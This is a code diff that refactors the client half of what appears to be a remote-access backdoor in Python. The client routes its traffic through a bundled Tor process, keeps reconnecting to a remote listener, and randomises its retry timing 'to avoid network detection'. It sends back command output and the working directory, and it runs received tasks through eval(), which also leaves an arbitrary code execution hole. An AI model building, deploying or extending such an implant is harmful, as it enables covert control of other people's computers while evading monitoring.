@@ -1,6 +1,5 @@
 import socks
 import socket
-import sys
 import subprocess as sp
 import os
 import sys
@@ -17,20 +16,21 @@ class Tor:
 
     def __init__(self):
         if os.name == 'nt':
-            self.start()
+            self.tor_process = self.start()
         socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
         socket.socket = socks.socksocket
 
     def start(self):
         try:
-            path = self.resource_path(self.PATH)
-            self.torProc = sp.Popen(path, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
+            path = Tor.resource_path(self.PATH)
+            tor_process = sp.Popen(path, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
         except sp.SubprocessError as error:
             print(str(error))
             sys.exit(1)
+        return tor_process
 
-    # Source: https://stackoverflow.com/questions/7674790/bundling-data-files-with-pyinstaller-onefile
-    def resource_path(self, relative_path):
+    @staticmethod
+    def resource_path(relative_path):
         # Get absolute path to resource, works for dev and for PyInstaller
         # needed because the path of the tor expert bundle changes due to pyinstaller
         base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
@@ -45,23 +45,23 @@ class ClientSocket:
     # timout in seconds between every connection try
     CONNECTION_TIMEOUT = 30
 
-    def __init__(self, remHost, remPort):
-        self.remAddr = (remHost, remPort)
-        self.__sock = self.createConnection()
+    def __init__(self, remote_host, remote_port):
+        self.remote_addr = (remote_host, remote_port)
+        self.__sock = self.create_connection()
 
-    def createConnection(self):
+    def create_connection(self):
         """
-        Recursivly try to connect to the listener until it works,
+        Recursively try to connect to the listener until it works,
         then return socket object.
         """
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(self.remAddr)
-        except socket.error as error:
+            sock.connect(self.remote_addr)
+        except socket.error:
             # randomize connection timeout to avoid network detection
             timeout = randint(self.CONNECTION_TIMEOUT - 10, self.CONNECTION_TIMEOUT + 10)
             sleep(timeout)
-            self.createConnection()
+            self.create_connection()
         else:
             return sock
 
@@ -72,18 +72,18 @@ class ClientSocket:
         """
         try:
             cwd = os.getcwd()
-            data = {'output' : output, 'cwd' : cwd}
+            data = {'output': output, 'cwd': cwd}
             self.__sock.send(str(data).encode(self.ENCODING))
         except socket.error:
             raise()
 
-    def receive(self, numBytes):
+    def receive(self, num_bytes):
         """
         The client receives a dictionary containing a task,
         and a list of optional arguments, dependent on the task.
         """
         try:
-            data = self.__sock.recv(numBytes)
+            data = self.__sock.recv(num_bytes)
             data = data.decode(self.ENCODING)
             data = eval(data)
         except socket.error:
@@ -94,5 +94,5 @@ class ClientSocket:
     def __del__(self):
         try:
             self.__sock.close()
-        except:
+        except NameError:
             pass
